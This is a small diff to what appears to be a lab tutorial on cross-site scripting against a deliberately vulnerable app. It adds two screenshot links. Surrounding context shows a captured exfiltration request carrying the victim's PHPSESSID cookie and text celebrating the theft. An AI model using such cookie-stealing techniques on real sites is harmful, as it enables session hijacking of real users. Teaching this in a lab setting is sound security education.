@@ -85,6 +85,7 @@ Now for the main event. We'll write a script that steals the victim's session co
 </script>
 ```
 
+![check](https://github.com/user-attachments/assets/d7205700-c209-4330-bc39-9eb19494d017)
 
 
 Let's break this down:
@@ -121,6 +122,9 @@ Once the victim clicks the link, their browser will execute the script. The page
 `GET /log?cookie=security%3Dlow%3B%20PHPSESSID%3D<VICTIM_SESSION_ID> HTTP/1.1`
 
 Congratulations, you've just captured the victim's session cookie!
+
+![session cookie](https://github.com/user-attachments/assets/e7c9c694-9f27-4b9c-9247-ebfd632da40f)
+
 
 ## The Consequences of a Successful Attack
 
